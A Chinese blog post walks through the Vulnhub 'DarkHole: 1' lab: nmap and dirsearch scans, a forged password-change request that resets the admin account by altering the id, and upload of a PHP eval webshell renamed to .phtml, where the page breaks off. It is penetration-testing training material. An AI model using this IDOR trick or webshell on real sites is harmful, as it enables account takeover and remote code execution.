<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog" data-next-head=""/><meta property="og:description" content="Sunset的个人博客" data-next-head=""/><meta property="og:url" content="https://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="https://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="https://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><title data-next-head="">重定向中...</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="https://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="https://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/b1513c3d3d6a31a1.css" as="style"/><link rel="stylesheet" href="/_next/static/css/b1513c3d3d6a31a1.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-8cac0b4b405cede1.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-603a6856ad27351b.js" defer=""></script><script src="/_next/static/chunks/999-39f23ad0a9336d72.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-dff55fd11394f709.js" defer=""></script><script src="/_next/static/HqVXsZTlrfHPzeS89Gdgh/_buildManifest.js" defer=""></script><script src="/_next/static/HqVXsZTlrfHPzeS89Gdgh/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><h1 class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"VulnhubDarkHole 1","contentHtml":"\u003ch1\u003eDarkHole: 1\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://www.vulnhub.com/entry/darkhole-1,724/\"\u003ehttps://www.vulnhub.com/entry/darkhole-1,724/\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2\u003e端口扫描主机发现\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e探测存活主机，\u003ccode\u003e184\u003c/code\u003e是靶机\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sP \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.0\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-11-08 09:59 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.1\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00027\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:C0:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e08\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.2\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00016\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:FB:CA:\u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.184\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00032\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eC:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e61\u003c/span\u003e:C5:\u003cspan class=\"hljs-number\"\u003e52\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.254\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00018\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:FE:CA:\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003eA (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.151\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e探测主机所有开放端口\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sT -min-rate \u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e -p- \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.184\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-11-08 09:59 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.184\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.0011\u003c/span\u003es latency).\nNot shown: \u003cspan class=\"hljs-number\"\u003e65533\u003c/span\u003e closed tcp \u003cspan class=\"hljs-title function_ invoke__\"\u003eports\u003c/span\u003e (conn-refused)\nPORT   STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp open  ssh\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp open  http\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eC:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e61\u003c/span\u003e:C5:\u003cspan class=\"hljs-number\"\u003e52\u003c/span\u003e (VMware)\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e探测服务版本以及系统版本\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sV -sT -O -p \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.184\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-11-08 09:59 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.184\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.0022\u003c/span\u003es latency).\n\nPORT   STATE SERVICE VERSION\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp open  ssh     OpenSSH \u003cspan class=\"hljs-number\"\u003e8.2\u003c/span\u003ep1 Ubuntu \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003eubuntu0.\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e (Ubuntu Linux; protocol \u003cspan class=\"hljs-number\"\u003e2.0\u003c/span\u003e)\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp open  http    Apache httpd \u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e41\u003c/span\u003e ((Ubuntu))\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eC:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e61\u003c/span\u003e:C5:\u003cspan class=\"hljs-number\"\u003e52\u003c/span\u003e (VMware)\nWarning: OSScan results may be unreliable because we could not find at least \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e open \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e closed port\nDevice type: general purpose\nRunning: Linux \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e.X|\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e.X\nOS CPE: cpe:/o:linux:linux_kernel:\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e cpe:/o:linux:linux_kernel:\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e\nOS details: Linux \u003cspan class=\"hljs-number\"\u003e4.15\u003c/span\u003e - \u003cspan class=\"hljs-number\"\u003e5.8\u003c/span\u003e\nNetwork Distance: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描漏洞\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003enmap -script=vuln -p \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.184\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e-08 \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.184\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00057\u003c/span\u003es latency).\n\nPORT   STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ssh\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  http\n| http-csrf: \n| Spidering limited to: maxdepth=\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e; maxpagecount=\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e; withinhost=\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.184\u003c/span\u003e\n|_http-dombased-xss: Couldn\u003cspan class=\"hljs-string\"\u003e't find any DOM based XSS.\n| http-cookie-flags: \n|   /: \n|     PHPSESSID: \n|       httponly flag not set\n|   /login.php: \n|     PHPSESSID: \n|_      httponly flag not set\n|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)\n|_http-stored-xss: Couldn'\u003c/span\u003et find \u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e stored XSS vulnerabilities.\n| http-enum: \n|   /login.php: Possible admin folder\n|   /config/: Potentially interesting directory w/ listing on \u003cspan class=\"hljs-string\"\u003e'apache/2.4.41 (ubuntu)'\u003c/span\u003e\n|   /css/: Potentially interesting directory w/ listing on \u003cspan class=\"hljs-string\"\u003e'apache/2.4.41 (ubuntu)'\u003c/span\u003e\n|   /js/: Potentially interesting directory w/ listing on \u003cspan class=\"hljs-string\"\u003e'apache/2.4.41 (ubuntu)'\u003c/span\u003e\n|_  /upload/: Potentially interesting directory w/ listing on \u003cspan class=\"hljs-string\"\u003e'apache/2.4.41 (ubuntu)'\u003c/span\u003e\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:0C:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e61\u003c/span\u003e:C5:\u003cspan class=\"hljs-number\"\u003e52\u003c/span\u003e (VMware)\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003eweb渗透\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e访问主页，存在登录页面链接\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubDarkHole%201/image69.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e先扫描目录看看\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003edirsearch -u http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.184\u003c/span\u003e -x \u003cspan class=\"hljs-number\"\u003e403\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e404\u003c/span\u003e \n//\n[\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e:07:\u003cspan class=\"hljs-number\"\u003e48\u003c/span\u003e] Starting:                                                                                                                                         \n[\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e:07:\u003cspan class=\"hljs-number\"\u003e48\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  313B  - /js  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.184\u003c/span\u003e/js/                \n[\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e:08:\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  317B  - /config  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.184\u003c/span\u003e/config/        \n[\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e:08:\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  460B  - /config/                                          \n[\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e:08:\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  314B  - /css  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.184\u003c/span\u003e/css/              \n[\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e:08:\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -   21B  - /dashboard.php                                    \n[\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e:08:\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  487B  - /js/                                              \n[\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e:08:\u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    1KB - /login.php                                        \n[\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e:08:\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e302\u003c/span\u003e -    0B  - /logout.php  -\u003e  login.php                        \n[\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e:08:\u003cspan class=\"hljs-number\"\u003e35\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    1KB - /register.php                                     \n[\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e:08:\u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  317B  - /upload  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.184\u003c/span\u003e/upload/        \n[\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e:08:\u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  456B  - /upload/       \n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e/dashboard.php\u003c/code\u003e  无权限\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e/upload\u003c/code\u003e 上传文件夹\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e/config\u003c/code\u003e 存在database.php\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e登陆页面存在注册，我们注册用户\u003ccode\u003etest\u003c/code\u003e登录\u003c/p\u003e\n\u003cp\u003e进去后发现可以\u003ccode\u003eupdate\u003c/code\u003e信息以及更改密码，感觉会存在注入\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubDarkHole%201/image70.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e测试是否存在注入\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003eDetails Update\u003c/code\u003e 部分\u003c/p\u003e\n\u003cp\u003e使用\u003ccode\u003esql\u003c/code\u003e测试没找到注入点\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003ePassword Change\u003c/code\u003e 部分\u003c/p\u003e\n\u003cp\u003e这部分没注入….但是修改密码区域可以抓包将传入的\u003ccode\u003eid\u003c/code\u003e值修改，我们可以将其修改为\u003ccode\u003eid=1\u003c/code\u003e的用户（可能是管理用户）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ePOST /dashboard.php?\u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e=\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e HTTP/\u003cspan class=\"hljs-number\"\u003e1.1\u003c/span\u003e\nHost: \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.184\u003c/span\u003e\nUser-Agent: Mozilla/\u003cspan class=\"hljs-number\"\u003e5.0\u003c/span\u003e (Windows NT \u003cspan class=\"hljs-number\"\u003e10.0\u003c/span\u003e; Win64; x64; rv:\u003cspan class=\"hljs-number\"\u003e132.0\u003c/span\u003e) Gecko/\u003cspan class=\"hljs-number\"\u003e20100101\u003c/span\u003e Firefox/\u003cspan class=\"hljs-number\"\u003e132.0\u003c/span\u003e\nAccept: text/html,application/xhtml+xml,application/xml;q=\u003cspan class=\"hljs-number\"\u003e0.9\u003c/span\u003e,*/*;q=\u003cspan class=\"hljs-number\"\u003e0.8\u003c/span\u003e\nAccept-Language: zh-CN,zh;q=\u003cspan class=\"hljs-number\"\u003e0.8\u003c/span\u003e,zh-TW;q=\u003cspan class=\"hljs-number\"\u003e0.7\u003c/span\u003e,zh-HK;q=\u003cspan class=\"hljs-number\"\u003e0.5\u003c/span\u003e,en-US;q=\u003cspan class=\"hljs-number\"\u003e0.3\u003c/span\u003e,en;q=\u003cspan class=\"hljs-number\"\u003e0.2\u003c/span\u003e\nAccept-Encoding: gzip, deflate, br\nContent-\u003cspan class=\"hljs-type\"\u003eType\u003c/span\u003e: application/x-www-form-urlencoded\nContent-Length: \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e\nOrigin: http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.184\u003c/span\u003e\nSec-GPC: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\nConnection: keep-alive\nReferer: http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.184\u003c/span\u003e/dashboard.php?\u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e=\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e\nCookie: PHPSESSID=aal4svnq3poomufcq5sv2lo2fu\nUpgrade-Insecure-Requests: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\nPriority: u=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e, i\n\npassword=\u003cspan class=\"hljs-number\"\u003e123456\u003c/span\u003e\u0026#x26;\u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e=\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e成功将包发送，提示\u003ccode\u003ePassword has been change\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e登陆后台，用户名使用\u003ccode\u003eadmin\u003c/code\u003e ，密码是用修改后的\u003ccode\u003e123456\u003c/code\u003e ，成功进入\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubDarkHole%201/image71.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e多了个上传文件框\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e尝试文件上传上传🐎\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e直接上传\u003ccode\u003e2.php\u003c/code\u003e ，内容是一句马，提示：\u003ccode\u003eSorry , Allow Ex : jpg,png,gif\u003c/code\u003e 看着像是白名单\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e尝试了一下，不只是可以上传\u003ccode\u003ejpg,png,gif\u003c/code\u003e ，也可以上传别的后缀文件，所以更像是把\u003ccode\u003ephp\u003c/code\u003e类的文件后缀放进黑名单了\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e这里涉及到一些文件上传\u003ccode\u003eCTF\u003c/code\u003e的套路，我们将\u003ccode\u003ephp\u003c/code\u003e改为其他可以解释为\u003ccode\u003ephp\u003c/code\u003e文件的后缀，我将其修改为\u003ccode\u003ephtml\u003c/code\u003e ，上传成功（我是抓包后修改的，也可以直接修改文件后缀然后直接上传）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eContent-Disposition: form-data; name=\u003cspan class=\"hljs-string\"\u003e\"fileToUpload\"\u003c/span\u003e; filename=\u003cspan class=\"hljs-string\"\u003e\"2.phtml\"\u003c/span\u003e\nContent-\u003cspan class=\"hljs-type\"\u003eType\u003c/span\u003e: application/octet-stream\n\n\u0026#x3C;?php @\u003cspan class=\"hljs-built_in\"\u003eeval\u003c/span\u003e($_POST[x]); 